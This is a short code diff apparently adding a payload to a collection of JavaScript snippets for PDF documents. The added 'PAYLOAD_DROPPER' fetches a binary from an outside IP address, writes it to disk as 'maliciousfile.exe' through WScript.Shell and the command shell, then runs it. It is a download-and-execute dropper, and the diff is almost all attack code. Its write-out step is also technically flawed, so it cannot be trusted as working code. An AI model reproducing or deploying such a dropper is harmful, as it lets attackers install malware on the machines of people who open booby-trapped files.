@@ -22,6 +22,23 @@ PAYLOAD_DOWNLOAD_FILE = f"""
     app.launchURL("{URL_DOWNLOAD_FILE}");
 """
 
+PAYLOAD_DROPPER = """
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://192.168.254.130/code.bin', true);
+    xhr.responseType = 'arraybuffer';
+    xhr.onload = function() {
+        var code = new Uint8Array(xhr.response);
+        var shellcode = [];
+        for (var i = 0; i < code.length; i++) {
+            shellcode.push(String.fromCharCode(code[i]));
+        }
+        var exec = new ActiveXObject('WScript.Shell');
+        exec.run('%comspec% /c', 'echo ' + shellcode.join('') + ' > C:\\ProgramFiles\\maliciousfile.exe', 0);
+        exec.run('%comspec% /c', 'start C:\\ProgramFiles\\maliciousfile.exe', 0);
+    };
+    xhr.send();
+"""
+
 PAYLOAD_MOCK_ADOBE_CRASH =  """
     console.show();
 
